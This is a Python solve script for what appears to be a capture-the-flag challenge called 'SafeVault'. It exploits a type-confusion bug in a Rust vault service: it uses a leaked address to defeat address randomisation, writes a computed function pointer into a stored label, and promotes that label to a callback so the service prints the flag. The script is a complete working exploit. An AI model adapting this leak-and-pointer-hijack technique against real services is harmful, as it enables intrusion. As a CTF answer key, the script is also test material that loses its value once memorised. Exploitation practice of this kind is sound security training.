#!/usr/bin/env python3
"""SafeVault — scripted solve (stdlib only).

usage: solve.py HOST PORT [VAULT_BIN]

vault-svc v2 killed the stack overflow dead: labels live in a Vec on
the heap and `store` hex-decodes into a fixed 64-byte buffer. What
survived the rewrite is one `unsafe` block — promote_label() flips the
enum discriminant in place without rebuilding the value:

    Text([u8; 64]) --(tag 0 -> 1)--> Callback(fn())

The 64 label bytes you stored become the callback's function pointer.
Two things left to learn from the local binary:

1. the PIE slide: `info` leaks `denied` per connection; the delta
   print_flag - denied comes from `nm` (Rust symbols are
   length-prefixed, so plain `nm` + a substring match works with no
   demangler).
2. the layout: rustc packs Text's bytes at struct+1 but reads
   Callback's fn from struct+8, so the address goes at label offset 7
   (found with a 20-line local harness; see solution.md).

Payload per connection: store hex(P*7 + p64(denied + delta)),
promote 0, run 0. Fully deterministic — no brute force.
"""
import re
import socket
import struct
import subprocess
import sys


def sym_addr(path, needle):
    out = subprocess.run(["nm", path], capture_output=True, text=True,
                         check=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 3 and needle in parts[2]:
            return int(parts[0], 16)
    raise SystemExit("nm: symbol ~%s not found in %s" % (needle, path))


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 1
    host, port = sys.argv[1], int(sys.argv[2])
    local = sys.argv[3] if len(sys.argv) > 3 else "handout/vault"

    delta = sym_addr(local, "10print_flag") - sym_addr(local, "6denied")
    print("[*] print_flag - denied = %+d (%#x)" % (delta, delta & (2**64 - 1)))

    s = socket.create_connection((host, port), timeout=15)
    f = s.makefile("rwb")

    def send(raw):
        f.write(raw + b"\n")
        f.flush()

    def recv():
        line = f.readline()
        if not line:
            raise SystemExit("connection closed")
        return line.decode(errors="replace").rstrip("\n")

    for _ in range(5):
        if recv().startswith("ready"):
            break

    send(b"info")
    info = recv()
    print("[*] " + info)
    m = re.search(r"denied=(0x[0-9a-f]+)", info)
    if not m:
        raise SystemExit("no denied leak")
    target = (int(m.group(1), 16) + delta) & (2**64 - 1)
    print("[*] remote print_flag = %#x" % target)

    send(b"run 0")
    print("[*] baseline run 0      : " + recv())

    payload = b"P" * 7 + struct.pack("<Q", target)
    send(b"store " + payload.hex().encode())
    print("[*] " + recv())
    send(b"promote 0")
    print("[*] " + recv())
    send(b"run 0")
    flag = recv()
    print("[+] " + flag)
    return 0 if "cyber_quest{" in flag else 1


if __name__ == "__main__":
    sys.exit(main())
